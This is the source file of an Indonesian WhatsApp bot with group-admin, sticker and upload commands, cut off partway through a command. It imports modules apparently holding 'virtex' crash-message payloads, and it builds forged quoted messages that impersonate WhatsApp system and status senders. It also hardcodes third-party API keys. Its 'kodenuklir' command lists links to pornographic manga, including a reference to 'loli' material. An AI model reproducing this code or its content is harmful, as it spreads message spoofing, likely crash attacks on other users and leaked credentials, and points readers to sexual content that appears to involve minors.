const
	{
		WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
	} = require("@adiwajshing/baileys")
const fs = require("fs")
const axios = require('axios')
const speed = require("performance-now")
const util = require('util')
const crypto = require('crypto')
const request = require('request')
const { exec, spawn } = require('child_process')
const fetch = require('node-fetch')
const moment = require('moment-timezone')
const ffmpeg = require('fluent-ffmpeg')
const { buttonvirus } = require('./database/virtex/buttonvirus')
const { ranzmods } = require('./database/virtex/ranzmods')
const { vapi } = require('./database/virtex/vapi')
const { philips } = require('./database/virtex/philips')
const { removeBackgroundFromImageFile } = require('remove.bg')
const { fetchJosn, kyun, fetchText } = require('./lib/fetcher')
const { color, bgcolor } = require('./lib/color')
const { cvirus } = require('./database/virtex/cvirus')
const { virtex } = require('./database/virtex/virtex')
const { virtex2 } = require('./database/virtex/virtex2')
const { virtex3 } = require('./database/virtex/virtex3')
const { virtex4 } = require('./database/virtex/virtex4')
const { virtex5 } = require('./database/virtex/virtex5')
const { virtex6 } = require('./database/virtex/virtex6')
const { virtex7 } = require('./database/virtex/virtex7')
const { virtex8 } = require('./database/virtex/virtex8')
const { virtex9 } = require('./database/virtex/virtex9')
const thumbyt = fs.readFileSync('media/ranz.jpg')
const { jadibot, stopjadibot, listjadibot } = require ('./lib/jadibot')
const { wait, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, start, info, success, close } = require('./lib/functions')
const setting = JSON.parse(fs.readFileSync('./media/setting.json'))
const scommand = JSON.parse(fs.readFileSync('./database/scommand.json'))
const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    scommand.push(obj)
    fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
}
const getCommandPosition = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}
const getCmd = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return scommand[position].chats
    }
}
const checkSCommand = (id) => {
    let status = false
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            status = true
        }
    })
    return status
}
owner = setting.OwnerNumber
botname = setting.BotName
lolkey = setting.lolKey
apikey = setting.apikey
ownername = setting.OwnerName
creator = 'RANZ M5' 
recode = 'RANZ M5' 
publik = true 
runtimebio = 'BOT IMV TEAM [🔥]' 
module.exports = wibu = async (wibu, mek, _welkom) => {
	try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
		if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		global.blocked
        	mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const { text, extendedText, contact, contactsArray, groupInviteMessage, listMessage, buttonsMessage, location, liveLocation, image, video, sticker, document, audio, product, quotedMsg } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
        const type = Object.keys(mek.message)[0]        
        const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
        const prefix = /^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*@,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*,;]/gi) : '-'          	
        body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'videoMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'extendedTextMessage') && mek.message[type].text.startsWith(prefix) ? mek.message[type].text : (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : ""
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''		
		const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()		
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)		
		const arg = budy.slice(command.length + 2, budy.length)	
		const q = args.join(' ')		
		const Verived = "0@s.whatsapp.net"
		const txt = mek.message.conversation
		const botNumber = wibu.user.jid
		const ownerNumber = [`${owner}@s.whatsapp.net`, `6283144394823@s.whatsapp.net`]
		const isGroup = from.endsWith('@g.us')
		let sender = isGroup ? mek.participant : mek.key.remoteJid
		const totalchat = await wibu.chats.all()
		const groupMetadata = isGroup ? await wibu.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const conts = mek.key.fromMe ? wibu.user.jid : wibu.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? wibu.user.name : conts.notify || conts.vname || conts.name || '-'
        
        
		const isWelkom = isGroup ? _welkom.includes(from) : true
		const isOwner = ownerNumber.includes(sender)
		const isMybot = isOwner || mek.key.fromMe

		mess = {
	    wait: 'Sabar Napa',
		success: 'Done',
		error: {
		stick: 'Gagal❕',
	    Iv: 'Linknya Error !'
		},
		only: {
		admin: 'Kusus Admin!',
		group: 'Khusus Di Group!'
	    }
		}
		faketeks = 'wibu'
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }
        const reply = (teks) => {
            wibu.sendMessage(from, teks, text, {quoted: mek})
        }
        const sendMess = (hehe, teks) => {
            wibu.sendMessage(hehe, teks, text)
        }
        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? wibu.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : wibu.sendMessage(from, teks.trim(), extendedText, { quoted: ftrol, contextInfo: { "mentionedJid": memberr } })
        }
        const zero = fs.readFileSync ('./media/ranz.jpg')
        const costum = (pesan, tipe, target, target2) => {
			wibu.sendMessage(from, pesan, tipe, { quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target2}` } } })
		}
		//Runtime
		const runtime = function (seconds) {
  seconds = Number(seconds);
  var d = Math.floor(seconds / (3600 * 24));
  var h = Math.floor((seconds % (3600 * 24)) / 3600);
  var m = Math.floor((seconds % 3600) / 60);
  var s = Math.floor(seconds % 60);
  var dDisplay = d > 0 ? d + (d == 1 ? " hari, " : " Hari, ") : "";
  var hDisplay = h > 0 ? h + (h == 1 ? " jam, " : " Jam, ") : "";
  var mDisplay = m > 0 ? m + (m == 1 ? " menit, " : " Menit, ") : "";
  var sDisplay = s > 0 ? s + (s == 1 ? " detik" : " Detik") : "";
  return dDisplay + hDisplay + mDisplay + sDisplay;
};
var ase = new Date();
                        var WaktuNya = ase.getHours();
                         switch(WaktuNya){    
case 0: WaktuNya = "Jangan gadang kak"; break;
case 1: WaktuNya = "Jangan gadang kak"; break;
case 2: WaktuNya = "Jangan gadang kak"; break;
case 3: WaktuNya = "Jangan gadang kak"; break;
case 4: WaktuNya = "Sholat subuh kak"; break;
case 5: WaktuNya = "Selamat pagi"; break;
case 6: WaktuNya = "Selamat pagi"; break;
case 7: WaktuNya = "Selamat pagi"; break;
case 8: WaktuNya = "Selamat pagi"; break;
case 9: WaktuNya = "Selamat pagi"; break;
case 10: WaktuNya = "Selamat pagi"; break;
case 11: WaktuNya = "Selamat siang"; break;
case 12: WaktuNya = "sholat Zuhur kak"; break;
case 13: WaktuNya = "Selamat siang"; break;
case 14: WaktuNya = "Selamat sore"; break;
case 15: WaktuNya = "sholat Ashar kak"; break;
case 16: WaktuNya = "Selamat sore"; break;
case 17: WaktuNya = "Selamat sore"; break;
case 18: WaktuNya = "Selamat malam"; break;
case 19: WaktuNya = "sholat Isya kak"; break;
case 20: WaktuNya = "Selamat malam"; break;
case 21: WaktuNya = "Selamat malam"; break;
case 22: WaktuNya = "Selamat malam"; break;
case 23: WaktuNya = "Selamat malam"; break;
}
//SLOT GAME
var tampilUcapan = "" + WaktuNya;
const sotoy = ['🍊 : 🍒 : 🍐','🍒 : 🔔 : 🍊','🍇 : 🍇 : 🍇','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔',		'🍐 : 🍒 : 🍋','🍐 : 🍐 : 🍐','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇','🔔 : 🔔 : 🔔','🍒 : 🍒 : 🍒','🍌 : 🍌 : 🍌']
const sotoy2 = ['🍊 : 🍒 : 🍐','🍒 : 🔔 : 🍊','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔',		'🍐 : 🍒 : 🍋','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇']
const sotoy1 = ['🍊 : 🍒 : 🍐','🍒 : 🔔 : 🍊','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔',		'🍐 : 🍒 : 🍋','🍊 : 🍒 : 🍒','?? : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇']
const sotoy3 = ['🔔 : 🔔 : 🔔','🍒 : 🍒 : 🍒','🍌 : 🍌 : 🍌']
const buruh1 = ['🐳','🦈','🐬','🐋','🐟','🐠','🦐','🦑','🦀','🐚']
const buruh2 = ['🐔','🦃','🐿','🐐','🐏','🐖','🐑','🐎','🐺','🦩']
const buruh3 = ['🦋','🕷','🐝','🐉','🦆','🦅','🕊','🐧','🐦','🦇']
const buruh11 = buruh1[Math.floor(Math.random() * (buruh1.length))]
const buruh22 = buruh2[Math.floor(Math.random() * (buruh2.length))]
const buruh33 = buruh3[Math.floor(Math.random() * (buruh3.length))]        

const replyy = (teks) => {
wibu.sendMessage(from, teks, text, { quoted: mek, contextInfo: { externalAdReply: { title: `${botname}`, body: 'By : Ranz', sourceUrl: "https://youtube.com/channel/UCSpYxXxRuGOfezlWd1S7Amw", thumbnail: fs.readFileSync('./media/thumnail.jpg') }}})
}             

const sendButtonLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await wibu.prepareMessage(from, kma, location,{ waitForAck: true })
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
wibu.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}

const sendButton = async (from, context, fortext, but, mek) => {
buttonMessages = {
contentText: context,
footerText: fortext,
buttons: but,
headerType: 1
}
wibu.sendMessage(from, buttonMessages, buttonsMessage, {
quoted: ftrol
})
}         

const sendButImage = async (from, context, fortext, img, but, mek) => {
jadinya = await wibu.prepareMessage(from, img, image)
buttonMessagesI = {
imageMessage: jadinya.message.imageMessage,
contentText: context,
footerText: fortext,
buttons: but,
headerType: 4
}
wibu.sendMessage(from, buttonMessagesI, buttonsMessage, {
                quoted: ftrol,
                contexInfo: adyt
            })
        }        
const adyt = { 
"title": `Hallo ${pushname}`,
"body": `hy`, 
"mediaType": "2", 
"mediaUrl": "https://youtube.com/channel/UCSpYxXxRuGOfezlWd1S7Amw", 
"thumbnail": fs.readFileSync('./media/ranz.jpg')
}



const fakestatus = (teks) => {
wibu.sendMessage(from, teks, text, {
quoted: {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"imageMessage": {
"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
"mimetype": "image/jpeg",
"caption": faketeks,
"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
"fileLength": "28777",
"height": 1080,
"width": 1079,
"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
"fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
"directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
"mediaKeyTimestamp": "1610993486",
"jpegThumbnail": fs.readFileSync('./media/thumnail.jpg'),
"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
}
}
}
})
}       

const ftrol = {
key : {
participant : '0@s.whatsapp.net'
},
message: {
orderMessage: {
itemCount : 2022,
status: 1,
surface : 1,
message: `IMV TEAM`, 
orderTitle: `IMV TEAM`,
thumbnail: wibu, //Gambarnye
sellerJid: '0@s.whatsapp.net' 
}
}
}

const floc = {
key : {
participant : '0@s.whatsapp.net'
},
message: {
liveLocationMessage: {
caption: `${tampilUcapan} ${pushname}`,
jpegThumbnail: wibu
}
}
}

const fdoc = {
key : {
participant : '0@s.whatsapp.net'
},
message: {
documentMessage: {
title: `${tampilUcapan} ${pushname}`, 
jpegThumbnail: wibu
}
}
}           

        const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        wibu.sendMessage(to, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    wibu.sendMessage(to, media, type, { quoted: ftrol, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }   
                      



		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
		if (!publik) {
		if (!isOwner && !mek.key.fromMe) return
		}
      	if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))      	
     	if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))      	




switch (command) {
case 'menu':
case 'help':
menunya = `❏MENU BOT ADA DI BAWAH❏
`

	teks =
`

🤬 BUKAN MASTAH ADICK-ADICK 🤬

❏INFO BOT❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
┏━━⊱ 
┣🔥️Nama Bot : ${botname}
┣🔥️Nama Owner : ${ownername}
┣🔥️Nomor Owner : ${owner}
┣🔥️Creator : ${creator}
┣🔥️Prefix : Multi
┣🔥️Runtime : ${runtime(process.uptime())}
┗━━⊱
❏INFO USER❏
┏━━⊱ 
┣🔥️Nama User : ${pushname}
┣🔥️Nomer User : ${sender.split("@")[0]}
┗━━⊱
❏TO DAY❏
┏━━⊱ 
┣🔥️${tampilUcapan}
┣🔥️Jam : ${time}
┗━━⊱
`
gam = fs.readFileSync('./media/thumnail.jpg')
but = [{buttonId: `${prefix}yuuzzxgyu`, buttonText: { displayText: '⎙ IMV BOT MENU' }, type: 1 },]
sendButImage(from, teks, `${menunya}`, gam, but)        
break 
case 'developer':
menunya = `GA USAH RENAME CUKUP LU PAKE AJA !!
`

	teks =
`
❏DEVELOPER BOT❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
┏━━⊱ 
┣🔥IMV - TEAM ( 2013 )
┣🔥ISAL MODZ
┣🔥RANZ M5
┣🔥ALL MEMBER!!
┗━━⊱
❏NOTE❏
`
gam = fs.readFileSync('./media/thumnail.jpg')
but = [{buttonId: `${prefix}yuuzzxgyu`, buttonText: { displayText: 'BACK TO MENU IMV BOT' }, type: 1 },]
sendButImage(from, teks, `${menunya}`, gam, but)        
break 
case 'group':
if (!mek.key.fromMe) return reply('Lu siapa')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (!isGroup) return
if (args[0] === 'open') {
wibu.groupSettingChange(from, GroupSettingChange.messageSend, false)
reply(`Sukses membuka akses grup ${groupName}`)
} else if (args[0] === 'close') {
wibu.groupSettingChange(from, GroupSettingChange.messageSend, true)
reply(`Sukses menutup akses ${groupName}`)
}
break
case 'promote' :
if (!isGroup) return reply(mess.only.group)
if (!isBotGroupAdmins) return reply("Bot Bukan Admin :)")
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di jadi admin!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Perintah di terima, anda menjdi admin :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
wibu.groupMakeAdmin(from, mentioned)
} else {
mentions(`Perintah di terima, @${mentioned[0].split('@')[0]} Kamu Menjadi Admin Di Group *${groupMetadata.subject}*`, mentioned, true)
wibu.groupMakeAdmin(from, mentioned)
}
break
case 'demote' :
if (!isGroup) return reply(mess.only.group)
if (!isBotGroupAdmins) return reply("Bot Bukan Admin :)")
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tidak jadi admin!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Perintah di terima, anda tidak menjadi admin :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
wibu.groupDemoteAdmin(from, mentioned)
} else {
mentions(`Perintah di terima, Menurunkan : @${mentioned[0].split('@')[0]} Menjadi Member`, mentioned, true)
wibu.groupDemoteAdmin(from, mentioned)
}
break
case 'add' :
if (!isGroup) return reply(mess.only.group)
if (!isBotGroupAdmins) return reply("Bot Bukan Admin :)")
if (args.length < 1) return reply('Yang mau di add siapa??')
if (args[0].startsWith('08')) return reply('Gunakan kode negara Gan')
try {
num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
wibu.groupAdd(from, [num])
} catch (e) {
console.log('Error :', e)
reply('Gagal menambahkan target, mungkin karena di private')
}
break
case 'kick' :
if (!isGroup) return reply(mess.only.group)
if (!isBotGroupAdmins) return reply("Bot Bukan Admin :)")
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tendang!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Perintah di terima, mengeluarkan :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
wibu.groupRemove(from, mentioned)
} else {
mentions(`Perintah di terima, mengeluarkan : @${mentioned[0].split('@')[0]}`, mentioned, true)
wibu.groupRemove(from, mentioned)
}
break
case 'tourl': 
									var imgbb = require('imgbb-uploader')
									if (isQuotedAudio) {
										ger = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
										reply(mess.wait)
										owgi = await wibu.downloadAndSaveMediaMessage(ger)
										Okelor = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
										teks=`─ 「 *AUDIO TO URL* 」 ─

*🔖 Url : ${Okelor.display_url}*`
										reply(teks)
 
										} else if (isQuotedImage) {
											ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
											reply(mess.wait)
											owgi = await wibu.downloadAndSaveMediaMessage(ger)
											qbc = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
											teks=`─ 「 *IMAGE TO URL* 」 ─

*🔖Url : ${qbc.display_url}*`
											reply(teks)
											} else if (isQuotedVideo) {
												ger = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
												reply(mess.wait)
												owgi = await wibu.downloadAndSaveMediaMessage(ger)
												ffff = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
												teks=`─ 「 *VIDEO TO URL* 」 ─

*🔖 Url : ${ffff.display_url}*`
												reply(teks)
												} else if (isQuotedSticker) {
													ger = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
													reply(mess.wait)
													owgi = await wibu.downloadAndSaveMediaMessage(ger)
													vrr = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
													teks=`─ 「 *STICKER TO URL* 」 ─

*🔖 Url : ${vrr.display_url}*`
													reply(teks)
												}
											break
case 'sticker':
case 'stiker':
case 's':
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
const media = await wibu.downloadAndSaveMediaMessage(encmedia, './database/media_user')
ran = getRandom('.webp')
await ffmpeg(`./${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
reply(mess.error.stick)
})
.on('end', function () {
console.log('Finish')
buffer = fs.readFileSync(ran)
costum(buffer, sticker, Verived, `Jangan Lupa Subscribe Zero YT7`)
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
const media = await wibu.downloadAndSaveMediaMessage(encmedia, './database/media_user')
ran = getRandom('.webp')
reply(mess.wait)
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(`❌ Gagal, pada saat mengkonversi ${tipe} ke stiker. pastikan untuk video yang dikirim tidak lebih dari 9 detik`)
})
.on('end', function () {
console.log('Finish')
costum(fs.readFileSync(ran), sticker, Verived, `~ Nih Dah Jadi Gif Stikernya`)
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else if ((isMedia || isQuotedImage) && args[0] == 'nobg') {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
const media = await wibu.downloadAndSaveMediaMessage(encmedia, './database/media_user')
ranw = getRandom('.webp')
ranp = getRandom('.png')
reply(mess.wait)
keyrmbg = 'bcAvZyjYAjKkp1cmK8ZgQvWH'
await removeBackgroundFromImageFile({ path: media, apiKey: keyrmbg, size: 'auto', type: 'auto', ranp }).then(res => {
fs.unlinkSync(media)
let buffer = Buffer.from(res.base64img, 'base64')
fs.writeFileSync(ranp, buffer, (err) => {
if (err) return reply('Gagal, Terjadi kesalahan, silahkan coba beberapa saat lagi.')
})
exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
fs.unlinkSync(ranp)
if (err) return reply(mess.error.stick)
wibu.sendMessage(from, fs.readFileSync(ranw), sticker, { quoted: ftrol })
fs.unlinkSync(ranw)
})
})
} else {
reply(`Kirim gambar dengan caption ${prefix}sticker atau tag gambar yang sudah dikirim`)
}
break
case 'detikvn':
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
mediam = await wibu.downloadAndSaveMediaMessage(encmediam)
cokmatane = Number(args[0])
hah = fs.readFileSync(mediam)
wibu.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
fs.unlinkSync(mediam)
break
case 'detikvideo':
encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
median = await wibu.downloadAndSaveMediaMessage(encmedian)
cokmatane = Number(args[0])
hah = fs.readFileSync(median)
wibu.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: mek})
fs.unlinkSync(median)
break           
case 'kodenuklir':
			     try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
				var kodenuk = `Easy Mode :
• https://nhentai.net/g/316755/
• https://nhentai.net/g/316596/
• https://nhentai.net/g/311850/
• https://nhentai.net/g/315578/
• https://nhentai.net/g/315488/
• https://nhentai.net/g/315406/
• https://nhentai.net/g/315344/
• https://nhentai.net/g/315323/
• https://nhentai.net/g/315136/
• https://nhentai.net/g/315099/
Medium Mode :
• https://nhentai.net/g/316867/
• https://nhentai.net/g/316869/
• https://nhentai.net/g/316785/
• https://nhentai.net/g/316763/51/
• https://nhentai.net/g/316445/
• https://nhentai.net/g/316250/
• https://nhentai.net/g/311283/
• https://nhentai.net/g/265671/
• https://nhentai.net/g/312127/
• https://nhentai.net/g/311560/
Hard Mode :
• https://nhentai.net/g/316820/
• https://nhentai.net/g/316481/
• https://nhentai.net/g/316430/
• https://nhentai.net/g/276347/
• https://nhentai.net/g/196329/
• https://nhentai.net/g/304543/
• https://nhentai.net/g/295295/
• https://nhentai.net/g/311262/
• https://nhentai.net/g/311882/
• https://nhentai.net/g/312180/
Note : Easy mode = Sange, Biasa Aja, Mental Lemah :v
==============================
Medium Mode = Bisa bikin sange, Lumayan nyesek, Rasanya pengen coli teros, Mental Batu
==============================
Hard Mode = Menyebabkan amnesia, insomnia, hipotermia, kejang", serangan jantung, diare, pendarahan hebat, buang air tidak terkendali, rasa ingin baku hantam, frustasi, depresi, emosi tidak tertahan kan, sakit hati (ambyar), Mental Baja
==============================
Kode nuklir dr milf oneesan ampe gan***** loli
https://nhentai.net/g/271890/
https://nhentai.net/g/272057/
